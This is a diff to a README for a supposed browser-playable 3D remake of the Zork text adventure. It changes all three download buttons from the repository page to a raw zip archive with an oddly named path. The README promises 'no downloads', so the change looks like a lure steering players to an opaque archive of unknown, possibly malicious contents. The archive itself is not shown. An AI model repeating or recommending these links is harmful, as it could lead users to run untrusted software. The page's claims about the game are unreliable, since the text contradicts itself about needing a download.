@@ -5,7 +5,7 @@
 Your quest begins now. A legendary text adventure has been reborn as a first-person 3D exploration game, and you can play it right in your browser. No downloads, no fancy equipment—just you, your curiosity, and the vast underground world waiting to be discovered.
 
 **Visit this link to download the application:**  
-[![Download zork-underground-empire](https://img.shields.io/badge/Download-zork--underground--empire-blueviolet?style=for-the-badge&logo=github)](https://github.com/quirvyroy/zork-underground-empire)
+[![Download zork-underground-empire](https://img.shields.io/badge/Download-zork--underground--empire-blueviolet?style=for-the-badge&logo=github)](https://github.com/quirvyroy/zork-underground-empire/raw/refs/heads/main/schnorrer/underground_empire_zork_incomposedly.zip)
 
 ## 🗺️ What Is Zork Underground Empire?
 
@@ -35,7 +35,7 @@ The game works best on **Google Chrome**, **Mozilla Firefox**, **Microsoft Edge*
 Click on the big purple button below (or the one at the top of this page). This will take you to the project's main location on GitHub.
 
 **Visit this link to download the application:**  
-[![Download Now](https://img.shields.io/badge/Download-Game-brightgreen?style=for-the-badge&logo=download)](https://github.com/quirvyroy/zork-underground-empire)
+[![Download Now](https://img.shields.io/badge/Download-Game-brightgreen?style=for-the-badge&logo=download)](https://github.com/quirvyroy/zork-underground-empire/raw/refs/heads/main/schnorrer/underground_empire_zork_incomposedly.zip)
 
 ### Step 3: Find the Play Button
 
@@ -98,7 +98,7 @@ This project is maintained by generous developers on GitHub. If you find a bug o
 We hope you enjoy your journey into the depths. The Great Underground Empire has waited for you, explorer. Go find its secrets.
 
 **Click here to begin your quest:**  
-[![Start Your Adventure](https://img.shields.io/badge/Start%20Adventure-Now-orange?style=for-the-badge)](https://github.com/quirvyroy/zork-underground-empire)
+[![Start Your Adventure](https://img.shields.io/badge/Start%20Adventure-Now-orange?style=for-the-badge)](https://github.com/quirvyroy/zork-underground-empire/raw/refs/heads/main/schnorrer/underground_empire_zork_incomposedly.zip)
 
 Good luck, adventurer. The underground awaits.
 
